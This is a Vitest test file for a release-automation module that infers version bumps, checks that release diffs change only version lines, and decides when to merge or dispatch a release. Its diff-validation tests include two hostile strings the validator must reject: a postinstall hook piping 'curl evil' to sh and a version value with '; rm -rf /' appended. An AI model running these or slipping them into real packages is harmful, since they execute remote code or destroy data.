import { describe, expect, it } from 'vitest';

import {
  RELEASE_BRANCH,
  VERSION_FILES,
  classifyChecks,
  classifyPullRequest,
  decideNextStep,
  inferBump,
  isVersionOnlyDiff,
  nextVersion,
  releaseTitle,
} from './release-ship-core.mjs';

const TIP = 'a'.repeat(40);
const OLD = 'b'.repeat(40);
const green = { state: 'green', problems: [] as string[] };
const commit = (subject: string, body = '') => ({ subject, body });

describe('inferBump', () => {
  it('maps conventional commits to the bump they call for', () => {
    expect(inferBump([commit('fix: stop a crash')])).toBe('patch');
    expect(inferBump([commit('perf(core): faster scan')])).toBe('patch');
    expect(inferBump([commit('revert: undo the thing')])).toBe('patch');
    expect(inferBump([commit('feat(backup): add the format')])).toBe('minor');
  });

  it('takes the largest bump across all commits', () => {
    expect(inferBump([commit('fix: a'), commit('feat: b'), commit('fix: c')])).toBe('minor');
    expect(inferBump([commit('feat: b'), commit('fix!: reshape'), commit('fix: c')])).toBe('major');
  });

  it('treats a bang or a BREAKING CHANGE footer as major', () => {
    expect(inferBump([commit('feat(api)!: drop the flag')])).toBe('major');
    expect(inferBump([commit('fix: tidy', 'Details.\n\nBREAKING CHANGE: the flag is gone')])).toBe('major');
    expect(inferBump([commit('fix: tidy', 'BREAKING-CHANGE: also this form')])).toBe('major');
  });

  it('does not release on docs, chores, tests, CI, refactors or unconventional subjects', () => {
    expect(inferBump([commit('docs: words'), commit('chore: deps'), commit('test: more'), commit('ci: tweak'), commit('refactor: move'), commit('style: fmt')])).toBeNull();
    expect(inferBump([commit('Merge pull request #1 from a/b'), commit('just words'), commit('')])).toBeNull();
    expect(inferBump([])).toBeNull();
  });

  it('ignores release-preparation commits, so release notes cannot trigger the next release', () => {
    expect(inferBump([commit('chore: prepare release 2.32.0', 'Includes the work from #346.\n\nBREAKING CHANGE: noted in these release notes')])).toBeNull();
    expect(inferBump([commit('chore: prepare release 2.32.0', 'BREAKING CHANGE: noted'), commit('fix: a real fix')])).toBe('patch');
  });

  it('does not mistake a body line, or the middle of a subject, for a type', () => {
    expect(inferBump([commit('docs: explain', 'feat: this is only prose')])).toBeNull();
    expect(inferBump([commit('update the feat: parser'), commit('rename fix: to bugfix:')])).toBeNull();
  });
});

describe('nextVersion', () => {
  it('bumps', () => {
    expect(nextVersion('2.31.1', 'patch')).toBe('2.31.2');
    expect(nextVersion('2.31.1', 'minor')).toBe('2.32.0');
    expect(nextVersion('2.31.1', 'major')).toBe('3.0.0');
  });
  it('refuses prereleases, junk and unknown bumps', () => {
    expect(nextVersion('2.31.1-rc.1', 'patch')).toBeNull();
    expect(nextVersion('next', 'patch')).toBeNull();
    expect(nextVersion(undefined, 'patch')).toBeNull();
    expect(nextVersion('2.31.1', 'huge')).toBeNull();
  });
});

describe('isVersionOnlyDiff', () => {
  const header = 'diff --git a/package.json b/package.json\nindex 111..222 100644\n--- a/package.json\n+++ b/package.json\n@@ -1,4 +1,4 @@\n';
  it('accepts a diff that changes only version lines', () => {
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n`)).toBe(true);
  });
  it('accepts a lockfile that changes its two version lines', () => {
    const patch = `${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n   "packages": {\n-      "version": "2.31.1",\n+      "version": "2.32.0",\n`;
    expect(isVersionOnlyDiff(patch)).toBe(true);
  });
  it('rejects any other change, even alongside a version bump', () => {
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n+  "postinstall": "curl evil | sh",\n`)).toBe(false);
    expect(isVersionOnlyDiff(`${header}-  "node": ">=22",\n+  "node": ">=18",\n`)).toBe(false);
    expect(isVersionOnlyDiff(`${header}+  "versions": "2.32.0",\n`)).toBe(false);
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n+  "version": "2.32.0"; rm -rf /,\n`)).toBe(false);
  });
  it('does not mistake a changed content line that starts like a file header for one', () => {
    const bump = `${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n`;
    // A removed `-- sql comment`, a removed markdown rule `---`, and an added `++ x`.
    for (const line of ['--- sql comment', '----', '+++ x']) {
      expect(isVersionOnlyDiff(`${bump}${line}\n`), line).toBe(false);
    }
  });
  it('still reads every file header of a multi-file patch as a header', () => {
    const lock = 'diff --git a/package-lock.json b/package-lock.json\nindex 333..444 100644\n--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1,3 +1,3 @@\n-  "version": "2.31.1",\n+  "version": "2.32.0",\n';
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n${lock}`)).toBe(true);
  });
  it('ignores the no-newline marker', () => {
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n\\ No newline at end of file\n`)).toBe(true);
  });
  it('rejects a mode change, rename, copy or binary patch that has no +/- lines of its own', () => {
    const bump = '@@ -1,4 +1,4 @@\n-  "version": "2.31.1",\n+  "version": "2.32.0",\n';
    const file = (extra: string) => `diff --git a/package.json b/package.json\n${extra}index 111..222 100644\n--- a/package.json\n+++ b/package.json\n${bump}`;
    for (const extra of ['old mode 100644\nnew mode 100755\n', 'new file mode 100644\n', 'deleted file mode 100644\n', 'similarity index 90%\nrename from a\nrename to package.json\n', 'copy from a\ncopy to package.json\n']) {
      expect(isVersionOnlyDiff(file(extra)), extra).toBe(false);
    }
    expect(isVersionOnlyDiff(`${file('')}diff --git a/logo.png b/logo.png\nBinary files a/logo.png and b/logo.png differ\n`)).toBe(false);
  });
  it('requires the removed and added version lines to pair up around one new version', () => {
    const lock = `${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n   "packages": {\n-      "version": "2.31.1",\n+      "version": "2.32.0",\n`;
    expect(isVersionOnlyDiff(lock)).toBe(true);
    // A deleted version line, an extra added one, and a dependency moved to another version.
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n`)).toBe(false);
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n+  "version": "9.9.9",\n`)).toBe(false);
    expect(isVersionOnlyDiff(`${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n-      "version": "1.0.0",\n+      "version": "2.0.0",\n`)).toBe(false);
  });
  it('can require the new version to be the one the release is for', () => {
    const bump = `${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n`;
    expect(isVersionOnlyDiff(bump, '2.32.0')).toBe(true);
    expect(isVersionOnlyDiff(bump, '2.33.0')).toBe(false);
    expect(isVersionOnlyDiff(bump)).toBe(true);
  });
  it('refuses a line inside a hunk that it does not understand, such as a binary section after a hunk', () => {
    const bump = `${header}-  "version": "2.31.1",\n+  "version": "2.32.0",\n`;
    expect(isVersionOnlyDiff(`${bump}Binary files a/x and b/x differ\n`)).toBe(false);
    expect(isVersionOnlyDiff(`${bump}GIT binary patch\n`)).toBe(false);
    // An empty context line (a tool that strips trailing space) is fine.
    expect(isVersionOnlyDiff(`${bump}\n`)).toBe(true);
  });
  it('rejects an empty diff, which is not a bump', () => {
    expect(isVersionOnlyDiff('')).toBe(false);
    expect(isVersionOnlyDiff(header)).toBe(false);
    expect(isVersionOnlyDiff(undefined)).toBe(false);
  });
});

describe('classifyChecks', () => {
  const ok = (name: string) => ({ name, ok: true, reason: 'success' });
  const bad = (name: string, reason: string) => ({ name, ok: false, reason });

  it('is green when every check succeeded', () => {
    expect(classifyChecks([ok('a'), ok('b')])).toEqual({ state: 'green', problems: [] });
  });
  it('is pending while a check is still running', () => {
    expect(classifyChecks([ok('a'), bad('b', 'still in_progress')]).state).toBe('pending');
    expect(classifyChecks([bad('b', 'still queued')], { commitAgeMinutes: 999 }).state).toBe('pending');
  });
  it('waits for a check that has not appeared yet, but only for a grace period', () => {
    expect(classifyChecks([ok('a'), bad('b', 'missing')], { commitAgeMinutes: 3 }).state).toBe('pending');
    expect(classifyChecks([bad('b', 'no result for this exact SHA')], { commitAgeMinutes: 5 }).state).toBe('pending');
    const late = classifyChecks([bad('b', 'missing')], { commitAgeMinutes: 45 });
    expect(late.state).toBe('failed');
    expect(late.problems).toEqual(['b: missing']);
  });
  it('is failed as soon as one check failed, even while others still run', () => {
    const result = classifyChecks([bad('a', 'failure'), bad('b', 'still in_progress')]);
    expect(result).toEqual({ state: 'failed', problems: ['a: failure'] });
  });
  it.each(['failure', 'cancelled', 'skipped', 'neutral', 'timed_out', 'not reported by github-actions'])('treats %s as failed', (reason) => {
    expect(classifyChecks([bad('a', reason)]).state).toBe('failed');
  });
  it('does not call an empty or unreadable result green', () => {
    expect(classifyChecks([]).state).toBe('failed');
    expect(classifyChecks(undefined as never).state).toBe('failed');
  });
});

describe('classifyPullRequest', () => {
  const pass = { status: 'COMPLETED', conclusion: 'SUCCESS' };
  it('is ready only when GitHub says clean and every check passed', () => {
    expect(classifyPullRequest({ mergeStateStatus: 'CLEAN', mergeable: 'MERGEABLE', rollup: [pass, { status: 'COMPLETED', conclusion: 'SKIPPED' }] })).toBe('ready');
  });
  it('waits while checks run', () => {
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [pass, { status: 'IN_PROGRESS', conclusion: '' }] })).toBe('checks-pending');
    expect(classifyPullRequest({ mergeStateStatus: 'UNKNOWN', rollup: [pass] })).toBe('checks-pending');
  });
  it('reports conflicts and failures', () => {
    expect(classifyPullRequest({ mergeStateStatus: 'DIRTY', rollup: [pass] })).toBe('conflicting');
    expect(classifyPullRequest({ mergeStateStatus: 'CLEAN', mergeable: 'CONFLICTING', rollup: [pass] })).toBe('conflicting');
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [pass, { status: 'COMPLETED', conclusion: 'FAILURE' }] })).toBe('failing');
    expect(classifyPullRequest({ mergeStateStatus: 'UNSTABLE', rollup: [{ status: 'COMPLETED', conclusion: 'CANCELLED' }] })).toBe('failing');
  });
  it('stops for a person when blocked by something other than checks, once the checks have had time to appear', () => {
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [pass] })).toBe('blocked');
    expect(classifyPullRequest({ mergeStateStatus: 'BEHIND', rollup: [pass] })).toBe('blocked');
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [pass], ageMinutes: 30 })).toBe('blocked');
  });
  it('does not call a brand-new PR blocked: GitHub lists no checks and says BLOCKED for the first moments', () => {
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [] })).toBe('checks-pending');
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [], ageMinutes: 0.1 })).toBe('checks-pending');
    // Some workflows have reported and others have not been created yet.
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [pass], ageMinutes: 2 })).toBe('checks-pending');
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [pass], ageMinutes: 10 })).toBe('blocked');
  });
  it('still reports a failure or a conflict immediately on a young PR', () => {
    expect(classifyPullRequest({ mergeStateStatus: 'BLOCKED', rollup: [{ status: 'COMPLETED', conclusion: 'FAILURE' }], ageMinutes: 0.1 })).toBe('failing');
    expect(classifyPullRequest({ mergeStateStatus: 'DIRTY', rollup: [], ageMinutes: 0.1 })).toBe('conflicting');
  });
});

describe('decideNextStep', () => {
  const facts = (overrides: Record<string, unknown> = {}) => ({
    paused: false,
    inFlightRuns: [],
    mainVersion: '2.31.1',
    tipSha: TIP,
    latestTag: { version: '2.31.1', sha: OLD },
    releaseExists: true,
    commits: [commit('feat(backup): add the format')],
    releasePr: null,
    tipChecks: green,
    requestedBump: undefined,
    ...overrides,
  });
  const releasePr = (overrides: Record<string, unknown> = {}) => ({
    number: 360, headRef: RELEASE_BRANCH, title: releaseTitle('2.32.0'), version: '2.32.0',
    files: [...VERSION_FILES], diffVersionOnly: true, state: 'ready', ...overrides,
  });

  describe('guards that come first', () => {
    it('stops when paused, whatever else is true', () => {
      const step = decideNextStep(facts({ paused: true, mainVersion: '2.32.0', releasePr: releasePr() }));
      expect(step).toMatchObject({ action: 'stop', code: 'paused' });
      expect(step.message).toContain('Nothing was changed');
    });
    it('waits for a release that is already running instead of racing it', () => {
      const run = { databaseId: 77, status: 'in_progress', headSha: OLD };
      expect(decideNextStep(facts({ inFlightRuns: [run] }))).toMatchObject({ action: 'wait', waitFor: 'release-run', run });
    });
    it('puts pause above an in-flight run, so a paused repo never waits on or acts', () => {
      expect(decideNextStep(facts({ paused: true, inFlightRuns: [{ databaseId: 1, status: 'queued' }] })).action).toBe('stop');
    });
    it('refuses a version it does not manage', () => {
      expect(decideNextStep(facts({ mainVersion: '2.32.0-rc.1' }))).toMatchObject({ action: 'stop', code: 'unmanaged-version' });
      expect(decideNextStep(facts({ mainVersion: undefined }))).toMatchObject({ action: 'stop', code: 'unmanaged-version' });
    });
    it('refuses to go backwards', () => {
      expect(decideNextStep(facts({ mainVersion: '2.30.0' }))).toMatchObject({ action: 'stop', code: 'version-behind' });
    });
  });

  describe('a version is already prepared on main', () => {
    const prepared = { mainVersion: '2.32.0', releaseExists: false };
    it('dispatches the tip once every required check is green, pinned to that commit', () => {
      expect(decideNextStep(facts(prepared))).toEqual({ action: 'dispatch', version: '2.32.0', tipSha: TIP });
    });
    it('waits while checks run', () => {
      expect(decideNextStep(facts({ ...prepared, tipChecks: { state: 'pending', problems: [] } }))).toMatchObject({ action: 'wait', waitFor: 'main-checks' });
    });
    it('stops, with every reason, when a check failed', () => {
      const step = decideNextStep(facts({ ...prepared, tipChecks: { state: 'failed', problems: ['a: failure', 'b: cancelled'] } }));
      expect(step).toMatchObject({ action: 'stop', code: 'checks-failed' });
      expect(step.message).toContain('a: failure');
      expect(step.message).toContain('b: cancelled');
    });
    it('does not dispatch on unreadable check evidence', () => {
      expect(decideNextStep(facts({ ...prepared, tipChecks: undefined })).action).toBe('stop');
    });
    it('closes a release PR that main has already overtaken', () => {
      expect(decideNextStep(facts({ ...prepared, releasePr: releasePr() }))).toMatchObject({ action: 'close-release-pr', number: 360 });
    });
    it('can ship the very first release when there is no tag yet', () => {
      expect(decideNextStep(facts({ ...prepared, latestTag: null }))).toMatchObject({ action: 'dispatch', version: '2.32.0' });
    });
  });

  describe('main is at the latest tag', () => {
    it('is done when the tagged commit is the tip and the release exists', () => {
      expect(decideNextStep(facts({ latestTag: { version: '2.31.1', sha: TIP } }))).toMatchObject({ action: 'done', code: 'nothing-to-release' });
    });
    it('finishes a release that was tagged but never published', () => {
      expect(decideNextStep(facts({ latestTag: { version: '2.31.1', sha: TIP }, releaseExists: false }))).toEqual({ action: 'dispatch', version: '2.31.1', tipSha: TIP, rerun: true });
    });
  });

  describe('main has moved past the latest tag', () => {
    it('opens a release PR for a feature (minor)', () => {
      expect(decideNextStep(facts())).toEqual({ action: 'create-release-pr', bump: 'minor', version: '2.32.0', baseSha: TIP });
    });
    it('opens a patch release for fixes only', () => {
      expect(decideNextStep(facts({ commits: [commit('fix: a'), commit('docs: b')] }))).toMatchObject({ action: 'create-release-pr', bump: 'patch', version: '2.31.2' });
    });
    it('does not release docs, chores and refactors on their own', () => {
      expect(decideNextStep(facts({ commits: [commit('docs: a'), commit('chore: b'), commit('refactor: c')] }))).toMatchObject({ action: 'done', code: 'nothing-to-release' });
      expect(decideNextStep(facts({ commits: [] }))).toMatchObject({ action: 'done', code: 'nothing-to-release' });
    });
    it('lets the caller force a release of unreleasable changes', () => {
      expect(decideNextStep(facts({ commits: [commit('docs: a')], requestedBump: 'patch' }))).toMatchObject({ action: 'create-release-pr', bump: 'patch', version: '2.31.2' });
    });
    it('lets the caller choose a bigger bump than the commits imply', () => {
      expect(decideNextStep(facts({ requestedBump: 'major' }))).toMatchObject({ action: 'create-release-pr', bump: 'major', version: '3.0.0' });
    });
    it('never turns a breaking change into a major release without being told to', () => {
      expect(decideNextStep(facts({ commits: [commit('feat!: drop it')] }))).toMatchObject({ action: 'stop', code: 'major-needs-confirmation' });
      expect(decideNextStep(facts({ commits: [commit('feat!: drop it')], requestedBump: 'minor' }))).toMatchObject({ action: 'create-release-pr', bump: 'minor' });
      expect(decideNextStep(facts({ commits: [commit('feat!: drop it')], requestedBump: 'major' }))).toMatchObject({ action: 'create-release-pr', bump: 'major' });
    });

    describe('with a release PR already open (so a second agent joins instead of racing)', () => {
      it('merges it when it is ready', () => {
        expect(decideNextStep(facts({ releasePr: releasePr() }))).toEqual({ action: 'merge-release-pr', number: 360, version: '2.32.0' });
      });
      it('waits while its checks run', () => {
        expect(decideNextStep(facts({ releasePr: releasePr({ state: 'checks-pending' }) }))).toMatchObject({ action: 'wait', waitFor: 'release-pr-checks' });
      });
      it('replaces it when it conflicts', () => {
        expect(decideNextStep(facts({ releasePr: releasePr({ state: 'conflicting' }) }))).toMatchObject({ action: 'close-release-pr', number: 360 });
      });
      it('replaces it when main moved after the release PR was opened', () => {
        expect(decideNextStep(facts({ releasePr: releasePr({ baseSha: OLD }), tipSha: TIP }))).toMatchObject({
          action: 'close-release-pr',
          number: 360,
          reason: expect.stringContaining('main moved'),
        });
      });
      it('stops when its checks failed or a rule blocks it', () => {
        expect(decideNextStep(facts({ releasePr: releasePr({ state: 'failing' }) }))).toMatchObject({ action: 'stop', code: 'release-pr-failing' });
        expect(decideNextStep(facts({ releasePr: releasePr({ state: 'blocked' }) }))).toMatchObject({ action: 'stop', code: 'release-pr-blocked' });
      });

      it.each([
        ['a file outside the version files', { files: [...VERSION_FILES, 'src/index.ts'] }, /src\/index\.ts/],
        ['a CI workflow', { files: ['package.json', '.github/workflows/release.yml'] }, /release\.yml/],
        ['a diff that is more than version lines', { diffVersionOnly: false }, /more than version lines/],
        ['a branch other than release/next', { headRef: 'someone/else' }, /release\/next/],
        ['a title that is not a release title', { title: 'feat: sneak something in' }, /title/],
        ['no change to package.json', { files: ['gui/package.json'] }, /package\.json/],
        ['a version that is not above the latest tag', { version: '2.31.1' }, /not above/],
        ['a version that is not X.Y.Z', { version: 'latest' }, /X\.Y\.Z/],
      ])('refuses to merge a release PR with %s, even when GitHub says it is ready', (_name, change, problem) => {
        const step = decideNextStep(facts({ releasePr: releasePr(change) }));
        expect(step).toMatchObject({ action: 'stop', code: 'release-pr-unsafe', number: 360 });
        expect(step.message).toMatch(problem);
        expect(step.action).not.toBe('merge-release-pr');
      });
    });
  });
});
